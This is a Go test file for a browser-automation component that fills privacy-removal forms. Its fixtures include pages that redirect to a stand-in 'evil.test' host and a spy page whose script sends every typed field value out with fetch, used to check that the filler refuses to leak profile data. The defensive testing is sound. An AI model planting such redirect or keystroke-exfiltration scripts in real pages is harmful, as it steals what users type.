package browser

import (
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/eraser-privacy/eraser/internal/config"
)

// These tests drive real headless Chrome against local pages. They skip with
// -short (the pre-commit hook) and when Chrome isn't installed, except in CI,
// where a missing Chrome must fail rather than silently skip.
func requireChrome(t *testing.T) {
	t.Helper()
	if testing.Short() {
		t.Skip("drives a real browser; skipped with -short")
	}
	defer func() {
		if t.Skipped() && os.Getenv("CI") != "" {
			t.Fatal("Chrome is required in CI")
		}
	}()
	for _, name := range []string{"google-chrome", "google-chrome-stable", "chromium", "chromium-browser", "chrome"} {
		if _, err := exec.LookPath(name); err == nil {
			return
		}
	}
	if runtime.GOOS == "darwin" {
		if _, err := os.Stat("/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"); err == nil {
			return
		}
	}
	t.Skip("Chrome not installed")
}

const formPage = `<!doctype html><html><body>
<form method="POST" action="/submitted">
  <label for="email">Email</label><input type="email" id="email" name="email">
  <label for="first_name">First name</label><input id="first_name" name="first_name">
  <label for="last_name">Last name</label><input id="last_name" name="last_name">
  <label for="phone">Phone</label><input type="tel" id="phone" name="phone">
  <label for="dob">Date of birth</label><input id="dob" name="dob">
  <button type="submit">Submit request</button>
</form></body></html>`

// A form without a submit control, next to an unrelated button that must
// never be clicked.
const noButtonPage = `<!doctype html><html><body>
<header><button onclick="fetch('/danger', {method: 'POST'})">Delete my account</button></header>
<form method="POST" action="/submitted">
  <label for="email">Email</label><input type="email" id="email" name="email">
  <label for="first_name">First name</label><input id="first_name" name="first_name">
</form></body></html>`

const captchaPage = `<!doctype html><html><body>
<form method="POST" action="/submitted">
  <label for="email">Email</label><input type="email" id="email" name="email">
  <div class="g-recaptcha" data-sitekey="test-key" style="width:300px;height:80px"></div>
  <button type="submit">Submit request</button>
</form></body></html>`

// The street-address selectors also match "email_address"; filling the
// address must not overwrite the email already typed there.
const addressPage = `<!doctype html><html><body>
<form method="POST" action="/submitted">
  <input type="text" name="email_address" placeholder="Your email address">
  <input name="line1" placeholder="Street address">
  <input name="city" placeholder="City">
  <button type="submit">Submit request</button>
</form></body></html>`

// A site search form with a pre-filled box comes before the removal form.
// Only the form we filled may be submitted.
const searchFirstPage = `<!doctype html><html><body>
<form method="POST" action="/search"><input name="q" value="privacy"><button type="submit">Search</button></form>
<form method="POST" action="/submitted">
  <input type="email" name="email">
  <button type="submit">Submit request</button>
</form></body></html>`

// A newsletter sign-up comes before the removal form. Its email box is the
// first email field on the page, but the removal form is the one to fill.
const newsletterFirstPage = `<!doctype html><html><body>
<form method="POST" action="/newsletter"><input type="email" name="nl_email" placeholder="Get our newsletter"><button type="submit">Subscribe</button></form>
<form method="POST" action="/submitted">
  <input type="email" name="email"><input name="first_name"><input name="last_name">
  <button type="submit">Submit request</button>
</form></body></html>`

// Two forms that each take just an email: nothing says which is the removal
// form, so neither may be filled.
const twoLikelyFormsPage = `<!doctype html><html><body>
<form method="POST" action="/newsletter"><input type="email" name="nl_email"><button type="submit">Subscribe</button></form>
<form method="POST" action="/submitted"><input type="email" name="email"><button type="submit">Submit request</button></form>
</body></html>`

type formSite struct {
	*httptest.Server
	mu          sync.Mutex
	submissions []url.Values
	dangerHits  int
	searches    int
	newsletters int
	leaks       []string // field values another site's page saw
}

func (f *formSite) submitted() []url.Values {
	f.mu.Lock()
	defer f.mu.Unlock()
	return append([]url.Values(nil), f.submissions...)
}

func newFormSite(t *testing.T) *formSite {
	t.Helper()
	f := &formSite{}
	mux := http.NewServeMux()
	page := func(body string) http.HandlerFunc {
		return func(w http.ResponseWriter, r *http.Request) { _, _ = fmt.Fprint(w, body) }
	}
	mux.HandleFunc("/form", page(formPage))
	mux.HandleFunc("/no-button", page(noButtonPage))
	mux.HandleFunc("/captcha", page(captchaPage))
	mux.HandleFunc("/redirect-away", func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, "http://evil.test:"+r.URL.Query().Get("port")+"/form", http.StatusFound) //nolint:gosec // G710: test fixture redirects on purpose
	})
	mux.HandleFunc("/js-away", func(w http.ResponseWriter, r *http.Request) {
		_, _ = fmt.Fprintf(w, `<html><body><script>location.href = "http://evil.test:%s/form";</script></body></html>`, //nolint:gosec // G705: test fixture
			r.URL.Query().Get("port"))
	})
	mux.HandleFunc("/address", page(addressPage))
	mux.HandleFunc("/search-first", page(searchFirstPage))
	mux.HandleFunc("/newsletter-first", page(newsletterFirstPage))
	mux.HandleFunc("/two-forms", page(twoLikelyFormsPage))
	mux.HandleFunc("/newsletter", func(w http.ResponseWriter, r *http.Request) {
		f.mu.Lock()
		f.newsletters++
		f.mu.Unlock()
	})
	mux.HandleFunc("/search", func(w http.ResponseWriter, r *http.Request) {
		f.mu.Lock()
		f.searches++
		f.mu.Unlock()
	})
	// Starts navigating to another site as soon as the first field changes.
	mux.HandleFunc("/hop", func(w http.ResponseWriter, r *http.Request) {
		//nolint:gosec // G705: test fixture
		_, _ = fmt.Fprintf(w, `<!doctype html><html><body><form method="POST" action="/submitted">
  <input type="email" name="email" oninput="location.href = 'http://evil.test:%s/spy'">
  <input name="first_name"><input name="last_name"><input type="tel" name="phone">
  <button type="submit">Submit request</button>
</form></body></html>`, r.URL.Query().Get("port"))
	})
	// Another site's page that reports anything typed into it.
	mux.HandleFunc("/spy", page(`<!doctype html><html><body><form>
  <input type="email" name="email"><input name="first_name"><input name="last_name"><input type="tel" name="phone">
</form><script>
document.querySelectorAll('input').forEach(function(el) {
  ['input', 'change', 'keyup'].forEach(function(ev) {
    el.addEventListener(ev, function() { fetch('/leak?v=' + encodeURIComponent(el.name + '=' + el.value)); });
  });
});
</script></body></html>`))
	mux.HandleFunc("/leak", func(w http.ResponseWriter, r *http.Request) {
		f.mu.Lock()
		f.leaks = append(f.leaks, r.URL.Query().Get("v"))
		f.mu.Unlock()
	})
	mux.HandleFunc("/danger", func(w http.ResponseWriter, r *http.Request) {
		f.mu.Lock()
		f.dangerHits++
		f.mu.Unlock()
	})
	mux.HandleFunc("/submitted", func(w http.ResponseWriter, r *http.Request) {
		_ = r.ParseForm()
		f.mu.Lock()
		f.submissions = append(f.submissions, r.PostForm)
		f.mu.Unlock()
		_, _ = fmt.Fprint(w, "<html><body>Thank you</body></html>")
	})
	f.Server = httptest.NewServer(mux)
	t.Cleanup(f.Close)
	return f
}

var testProfile = config.Profile{
	FirstName: "Jane", LastName: "Doe", Email: "jane@example.com",
	Phone: "555-0100", DateOfBirth: "1990-01-01",
}

func newTestBrowser(t *testing.T) *Browser {
	t.Helper()
	return newTestBrowserWith(t, DefaultConfig())
}

// newTestBrowserWith starts Chrome with *.test names resolving to localhost,
// so tests can use distinct host names for one local server.
func newTestBrowserWith(t *testing.T, cfg BrowserConfig) *Browser {
	t.Helper()
	requireChrome(t)
	cfg.Timeout = 30 * time.Second
	cfg.hostResolverRules = "MAP *.test 127.0.0.1"
	b, err := New(cfg)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(b.Close)
	return b
}

// fillReq builds a request allowed only for the test server's own address.
func fillReq(site *formSite, path string, submit bool) FillRequest {
	return FillRequest{
		URL: site.URL + path, BrokerID: "acme", Profile: testProfile, Submit: submit,
		Allowed: func(u *url.URL) bool { return u.Host == mustHost(nil, site.URL) },
	}
}

func TestFillAndSubmit(t *testing.T) {
	site := newFormSite(t)
	b := newTestBrowser(t)

	res, err := b.NavigateAndFill(fillReq(site, "/form", true))
	if err != nil {
		t.Fatalf("NavigateAndFill: %v (%s)", err, res.ErrorMessage)
	}
	if !res.SubmitAttempted {
		t.Fatalf("form not submitted: %+v", res)
	}
	deadline := time.Now().Add(5 * time.Second)
	for len(site.submitted()) == 0 && time.Now().Before(deadline) {
		time.Sleep(50 * time.Millisecond)
	}
	subs := site.submitted()
	if len(subs) != 1 {
		t.Fatalf("server received %d submissions, want 1", len(subs))
	}
	if got := subs[0].Get("email"); got != "jane@example.com" {
		t.Errorf("email = %q", got)
	}
	if got := subs[0].Get("first_name"); got != "Jane" {
		t.Errorf("first_name = %q", got)
	}
}

// A form with no submit button must not be reported as submitted.
func TestNoSubmitButtonIsNotReportedAsSubmitted(t *testing.T) {
	site := newFormSite(t)
	b := newTestBrowser(t)

	res, _ := b.NavigateAndFill(fillReq(site, "/no-button", true))
	if res.SubmitAttempted {
		t.Errorf("reported as submitted without a submit button: %+v", res)
	}
	time.Sleep(500 * time.Millisecond)
	if n := len(site.submitted()); n != 0 {
		t.Errorf("server received %d submissions", n)
	}
	site.mu.Lock()
	defer site.mu.Unlock()
	if site.dangerHits != 0 {
		t.Error("clicked an unrelated 'Delete my account' button outside the form")
	}
}

// fill --pending processes several forms with one browser.
func TestSeveralFormsWithOneBrowser(t *testing.T) {
	site := newFormSite(t)
	b := newTestBrowser(t)

	for i := range 2 {
		res, err := b.NavigateAndFill(fillReq(site, "/form", false))
		if err != nil || len(res.FieldsFilled) == 0 {
			t.Fatalf("form %d: err=%v result=%+v", i+1, err, res)
		}
	}
}

// A form CAPTCHA must stop automatic submission (the user solves it).
func TestCaptchaFormIsNotSubmitted(t *testing.T) {
	site := newFormSite(t)
	b := newTestBrowser(t)

	res, err := b.NavigateAndFill(fillReq(site, "/captcha", true))
	if err != nil {
		t.Fatal(err)
	}
	if !res.CaptchaFound || res.SubmitAttempted {
		t.Fatalf("CaptchaFound=%v SubmitAttempted=%v (%s)", res.CaptchaFound, res.SubmitAttempted, res.ErrorMessage)
	}
	time.Sleep(500 * time.Millisecond)
	if n := len(site.submitted()); n != 0 {
		t.Errorf("server received %d submissions", n)
	}
}

// The page must stay on an allowed domain: a redirect (HTTP or script) to
// another site means nothing is filled or submitted.
func TestFillRefusesToLeaveAllowedDomain(t *testing.T) {
	site := newFormSite(t)
	b := newTestBrowserWith(t, DefaultConfig())
	port := mustURL(t, site.URL).Port()

	for _, path := range []string{"/redirect-away", "/js-away"} {
		t.Run(path, func(t *testing.T) {
			res, err := b.NavigateAndFill(FillRequest{
				URL: "http://broker.test:" + port + path + "?port=" + port, BrokerID: "acme",
				Profile: testProfile, Submit: true,
				Allowed: func(u *url.URL) bool { return u.Hostname() == "broker.test" },
			})
			if !errors.Is(err, ErrLeftAllowedDomain) {
				t.Fatalf("err = %v (result %+v), want ErrLeftAllowedDomain", err, res)
			}
			if len(res.FieldsFilled) > 0 || res.SubmitAttempted {
				t.Fatalf("filled %v / submitted %v on another domain", res.FieldsFilled, res.SubmitAttempted)
			}
		})
	}
	time.Sleep(500 * time.Millisecond)
	if n := len(site.submitted()); n != 0 {
		t.Fatalf("server received %d submissions", n)
	}
}

func TestFillRefusesDisallowedStartURL(t *testing.T) {
	site := newFormSite(t)
	b := newTestBrowser(t)
	req := fillReq(site, "/form", true)
	req.Allowed = func(*url.URL) bool { return false }
	if _, err := b.NavigateAndFill(req); !errors.Is(err, ErrLeftAllowedDomain) {
		t.Fatalf("err = %v, want ErrLeftAllowedDomain", err)
	}
}

func TestFillOnlyUsesGivenProfileFields(t *testing.T) {
	site := newFormSite(t)
	b := newTestBrowser(t)
	req := fillReq(site, "/form", true)
	req.Profile = config.Disclosure{}.Apply(testProfile) // name and email only

	if _, err := b.NavigateAndFill(req); err != nil {
		t.Fatal(err)
	}
	deadline := time.Now().Add(5 * time.Second)
	for len(site.submitted()) == 0 && time.Now().Before(deadline) {
		time.Sleep(50 * time.Millisecond)
	}
	subs := site.submitted()
	if len(subs) != 1 {
		t.Fatalf("got %d submissions", len(subs))
	}
	if subs[0].Get("phone") != "" || subs[0].Get("dob") != "" {
		t.Errorf("undisclosed fields sent: phone=%q dob=%q", subs[0].Get("phone"), subs[0].Get("dob"))
	}
	if subs[0].Get("email") != testProfile.Email {
		t.Errorf("email = %q", subs[0].Get("email"))
	}
}

func TestScreenshotsArePrivateAndStayInTheirFolder(t *testing.T) {
	site := newFormSite(t)
	dir := filepath.Join(t.TempDir(), "shots")
	cfg := DefaultConfig()
	cfg.ScreenshotDir = dir
	b := newTestBrowserWith(t, cfg)

	req := fillReq(site, "/form", false)
	req.BrokerID = "../../escape"
	res, err := b.NavigateAndFill(req)
	if err != nil || res.ScreenshotPath == "" {
		t.Fatalf("err=%v screenshot=%q", err, res.ScreenshotPath)
	}
	if strings.ContainsAny(res.ScreenshotPath, `/\`) || strings.Contains(res.ScreenshotPath, "..") {
		t.Fatalf("screenshot name %q can escape its folder", res.ScreenshotPath)
	}
	info, err := os.Stat(filepath.Join(dir, res.ScreenshotPath))
	if err != nil {
		t.Fatal(err)
	}
	if perm := info.Mode().Perm(); perm != 0o600 {
		t.Errorf("screenshot permissions %04o, want 0600", perm)
	}
	if dinfo, _ := os.Stat(dir); dinfo.Mode().Perm() != 0o700 {
		t.Errorf("screenshot folder permissions %04o, want 0700", dinfo.Mode().Perm())
	}
}

func mustURL(t *testing.T, raw string) *url.URL {
	t.Helper()
	u, err := url.Parse(raw)
	if err != nil {
		t.Fatal(err)
	}
	return u
}

func waitForSubmission(t *testing.T, site *formSite) url.Values {
	t.Helper()
	deadline := time.Now().Add(5 * time.Second)
	for len(site.submitted()) == 0 && time.Now().Before(deadline) {
		time.Sleep(50 * time.Millisecond)
	}
	subs := site.submitted()
	if len(subs) != 1 {
		t.Fatalf("server received %d submissions, want 1", len(subs))
	}
	return subs[0]
}

func TestFillNeverOverwritesAFilledField(t *testing.T) {
	site := newFormSite(t)
	b := newTestBrowser(t)
	req := fillReq(site, "/address", true)
	req.Profile.Address, req.Profile.City = "1 Main St", "Springfield"

	if res, err := b.NavigateAndFill(req); err != nil || !res.SubmitAttempted {
		t.Fatalf("err=%v result=%+v", err, res)
	}
	sub := waitForSubmission(t, site)
	for field, want := range map[string]string{"email_address": "jane@example.com", "line1": "1 Main St", "city": "Springfield"} {
		if got := sub.Get(field); got != want {
			t.Errorf("%s = %q, want %q", field, got, want)
		}
	}
}

func TestSubmitsOnlyTheFormItFilled(t *testing.T) {
	site := newFormSite(t)
	b := newTestBrowser(t)

	if res, err := b.NavigateAndFill(fillReq(site, "/search-first", true)); err != nil || !res.SubmitAttempted {
		t.Fatalf("err=%v result=%+v", err, res)
	}
	if sub := waitForSubmission(t, site); sub.Get("email") != "jane@example.com" {
		t.Errorf("email = %q", sub.Get("email"))
	}
	site.mu.Lock()
	defer site.mu.Unlock()
	if site.searches != 0 {
		t.Error("submitted the pre-filled search form instead of the removal form")
	}
}

// Fields are filled in the form that best matches the profile, not wherever
// the first email box on the page is, and only that form is submitted.
func TestFillsAndSubmitsTheBestMatchingForm(t *testing.T) {
	site := newFormSite(t)
	b := newTestBrowser(t)

	if res, err := b.NavigateAndFill(fillReq(site, "/newsletter-first", true)); err != nil || !res.SubmitAttempted {
		t.Fatalf("err=%v result=%+v", err, res)
	}
	sub := waitForSubmission(t, site)
	for field, want := range map[string]string{"email": "jane@example.com", "first_name": "Jane", "last_name": "Doe"} {
		if got := sub.Get(field); got != want {
			t.Errorf("%s = %q, want %q", field, got, want)
		}
	}
	site.mu.Lock()
	defer site.mu.Unlock()
	if site.newsletters != 0 {
		t.Error("submitted the newsletter form")
	}
}

// When two forms match equally well, nothing is filled or submitted.
func TestAmbiguousFormsAreNotFilled(t *testing.T) {
	site := newFormSite(t)
	b := newTestBrowser(t)

	res, err := b.NavigateAndFill(fillReq(site, "/two-forms", true))
	if !errors.Is(err, ErrAmbiguousForm) {
		t.Errorf("err = %v, want ErrAmbiguousForm", err)
	}
	if res.SubmitAttempted || len(res.FieldsFilled) != 0 {
		t.Errorf("filled or submitted an ambiguous page: %+v", res)
	}
	time.Sleep(500 * time.Millisecond)
	site.mu.Lock()
	defer site.mu.Unlock()
	if len(site.submissions) != 0 || site.newsletters != 0 {
		t.Errorf("submissions=%d newsletters=%d", len(site.submissions), site.newsletters)
	}
}

// If the page navigates away while fields are being filled, nothing more is
// filled: the other site must never see the profile.
func TestFillStopsWhenThePageNavigates(t *testing.T) {
	site := newFormSite(t)
	b := newTestBrowser(t)
	port := mustURL(t, site.URL).Port()

	res, err := b.NavigateAndFill(FillRequest{
		URL: "http://broker.test:" + port + "/hop?port=" + port, BrokerID: "acme", Profile: testProfile, Submit: true,
		Allowed: func(u *url.URL) bool { return u.Hostname() == "broker.test" },
	})
	if err == nil {
		t.Errorf("no error after the page navigated mid-fill: %+v", res)
	}
	if res.SubmitAttempted {
		t.Error("submitted after the page navigated")
	}
	time.Sleep(time.Second) // let any leak requests arrive
	site.mu.Lock()
	defer site.mu.Unlock()
	if len(site.leaks) > 0 {
		t.Errorf("another site's page saw the profile: %q", site.leaks)
	}
}
